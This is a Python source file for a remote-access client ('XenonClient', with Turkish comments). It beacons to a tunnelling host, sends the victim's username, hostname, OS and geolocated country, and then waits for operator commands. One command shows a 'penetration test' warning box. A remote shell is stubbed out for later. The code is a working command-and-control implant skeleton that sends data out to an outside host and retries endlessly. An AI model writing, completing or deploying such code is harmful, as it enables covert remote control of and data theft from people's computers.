import socket
import platform
import getpass
import json
import time
import urllib.request
import tkinter as tk
from tkinter import messagebox

class XenonClient:
    def __init__(self, server_ip, server_port):
        self.server_ip = server_ip
        self.server_port = server_port

    def get_recon_data(self):
        recon = {"id": f"{getpass.getuser()}@{platform.node()}", "os": f"{platform.system()} {platform.release()}", "country": "Unknown"}
        try:
            with urllib.request.urlopen("http://ip-api.com/json/", timeout=3) as response:
                recon["country"] = json.loads(response.read().decode()).get("countryCode", "??")
        except: recon["country"] = "N/A"
        return recon

    def run(self):
        while True:
            try:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.connect((self.server_ip, self.server_port))
                
                recon_packet = self.get_recon_data()
                self.sock.send(json.dumps(recon_packet).encode("utf-8"))
                
                while True:
                    command = self.sock.recv(1024).decode("utf-8")
                    if not command: break
                    
                    # KOMUT İŞLEME MERKEZİ
                    if command == "message":
                        # Basit bir test mesajı kutusu
                        root = tk.Tk()
                        root.withdraw()
                        messagebox.showwarning("Sistem Uyarısı", "Bu bilgisayar Xenon Sızma Testi altındadır.")
                        root.destroy()
                    
                    elif command == "shell":
                        # Buraya ileride CMD entegrasyonu gelecek
                        print("[*] Shell komutu alındı.")

            except:
                time.sleep(5)
            finally:
                try: self.sock.close()
                except: pass

if __name__ == "__main__":
    client = XenonClient("uwtd3ffva.localto.net", 6827)
    client.run()
